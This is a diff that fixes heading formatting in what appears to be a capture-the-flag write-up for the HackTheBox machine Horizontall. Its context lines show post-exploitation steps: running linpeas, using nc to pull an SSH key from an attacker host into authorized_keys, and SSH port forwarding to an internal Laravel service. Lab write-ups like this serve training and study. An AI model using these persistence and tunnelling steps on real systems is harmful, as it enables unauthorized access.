@@ -202,7 +202,7 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-##linpeas tells us it is having Larvel v8(PHP v7.4.18) on port 8000, We have to port forward this to our machine and for this we have to generate a pair of ssh keys 
+## linpeas tells us it is having Larvel v8(PHP v7.4.18) on port 8000, We have to port forward this to our machine and for this we have to generate a pair of ssh keys 
 ```
 ssh-keygen
 ```
@@ -218,11 +218,11 @@ nc -nv 10.10.14.157 3333 > authorized_keys
 
 ## Then the key will transfer into the /opt/strapi/.ssh/authorized_keys
 
-##Once this is complete, you can access it by using
+## Once this is complete, you can access it by using
 ```
 ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb 
 ```
-##Now we are strapi 
+## Now we are strapi 
 ```
 $ id
 uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
